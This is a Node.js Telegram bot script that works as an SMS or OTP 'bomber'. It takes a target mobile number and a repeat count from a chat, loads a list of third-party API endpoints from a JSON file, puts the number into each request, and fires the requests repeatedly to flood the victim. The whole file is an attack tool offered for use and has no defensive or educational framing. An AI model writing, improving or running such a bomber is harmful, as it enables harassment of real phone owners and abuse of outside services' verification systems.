const TelegramBot = require('node-telegram-bot-api');
const fetch = require('node-fetch');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
const token = 'YOUR_TELEGRAM_BOT_TOKEN';

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, { polling: true });

// Command to initiate the bombing
bot.onText(/\/send/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Please enter the amount and mobile number separated by space.");
});

// Listen for messages
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const message = msg.text;
    const [amount, mobile] = message.split(' ');

    if (amount > 0 && mobile.length == 10) {
        let c = 0;

        fetch("/assets/apis.json") // Make sure to provide the correct path to your APIs file
            .then(r => r.json())
            .then(r => {
                const APIS = r.apis;
                console.log(APIS);
                while (c < amount) {
                    APIS.forEach(API => {
                        const config = {
                            url: API.url.replace("*****", mobile),
                            method: API.method,
                            headers: API.headers,
                            body: API.body.replace("*****", mobile)
                        };
                        fetch(config.url, {
                            method: config.method,
                            headers: config.headers,
                            body: config.body
                        });
                        c += 1;
                    });
                }

                bot.sendMessage(chatId, "Processing Bombing Request...");
            }).catch(error => {
                console.error('Error', error);
                bot.sendMessage(chatId, "An error occurred while processing the request.");
            });
    } else {
        bot.sendMessage(chatId, "Invalid Number or Amount is null");
    }
});
